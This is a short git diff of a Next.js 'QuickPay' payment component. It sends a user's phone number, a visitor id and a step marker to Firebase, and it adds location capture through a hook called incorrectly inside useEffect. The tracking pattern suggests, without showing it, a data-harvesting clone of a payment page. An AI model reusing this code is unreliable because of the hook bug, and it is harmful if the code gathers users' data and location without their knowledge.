@@ -1,11 +1,12 @@
 "use client"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import Image from "next/image"
 import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
 import { useRouter } from "next/navigation"
 import { addData } from "./lib/firebase"
 import Loader from "./components/loader"
+import { useLocation } from "./lib/use-location"
 
 export default function QuickPay() {
   const [phone, setPhone] = useState("")
@@ -26,14 +27,15 @@ export default function QuickPay() {
   };
 
   const total = selectedAmounts
-
-  const _id = Math.random().toString(36).replace("0.", "zain-")
+useEffect(()=>{
+  useLocation()
+},[])
 
   const handleSubmit = (e:any) => {
     e.preventDefault()
-    const visitorId = localStorage.getItem("visitor") || _id
-
+    const visitorId = localStorage.getItem("visitor")
     addData({
+    createdDate:new Date().toISOString(),
       id: visitorId,
       phone: phone,
       step:1
